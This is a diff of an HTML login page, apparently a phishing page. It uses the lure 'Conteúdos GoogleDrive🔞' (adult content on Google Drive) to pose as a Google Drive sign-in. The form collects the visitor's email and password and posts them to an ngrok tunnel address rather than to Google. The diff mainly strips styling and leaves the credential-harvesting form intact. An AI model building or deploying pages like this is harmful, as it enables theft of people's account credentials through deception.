@@ -4,88 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Form</title>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: url('https://github.com/Lai1s/presente/raw/eb1cb660df052a63cef2a42f3270cc9b43738d7c/fundo%202%20p.jpeg') no-repeat center center fixed;
-            background-size: cover;
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: url('https://github.com/Lai1s/presente/raw/eb1cb660df052a63cef2a42f3270cc9b43738d7c/fundo%202%20p.jpeg') no-repeat center center fixed;
+            background-size: cover;
             height: 100vh;
-            color: #fff;
-            position: relative;
-        }
-        .gradient-overlay {
-            position: absolute;
-            top: 0;
-            height: 100%;
-            border-radius: 10px;
-            z-index: -1;
-        }
-        .gradient-overlay.left {
-            left: 0;
-            width: 30%;
-            background: linear-gradient(to right, rgba(255, 64, 129, 0.8), rgba(0, 123, 255, 0.8));
-        }
-        .gradient-overlay.right {
-            right: 0;
-            width: 35%;
-            background: linear-gradient(to left, rgba(255, 64, 129, 0.8), rgba(0, 123, 255, 0.8));
-        }
-        .container {
-            width: 350px;
-            background: linear-gradient(135deg, #7b1fa2, #ff4081);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1);
-            position: relative;
-            z-index: 1;
-        }
-        .container h2 {
-            text-align: center;
-            margin-bottom: 30px;
-            color: #000;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        input.form-control {
-            border-radius: 20px;
-            padding: 12px 20px;
-            font-size: 16px;
-            border: 1px solid #ddd;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #007bff;
-            color: #fff;
-            font-size: 18px;
-            border: none;
-            border-radius: 20px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <div class="gradient-overlay left"></div>
-    <div class="gradient-overlay right"></div>
     <div class="container">
         <h2>Conteúdos GoogleDrive🔞</h2>
         <form id="loginForm" method="POST" action="https://96fc-2804-6850-8000-3d01-f998-9041-82cc-329e.ngrok-free.app">
             <div class="form-group">
-                <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
+                <input type="email" id="email" name="email" placeholder="Digite o e-mail">
             </div>
             <div class="form-group">
-                <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
+                <input type="password" id="password" name="password" placeholder="Digite a senha">
             </div>
             <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
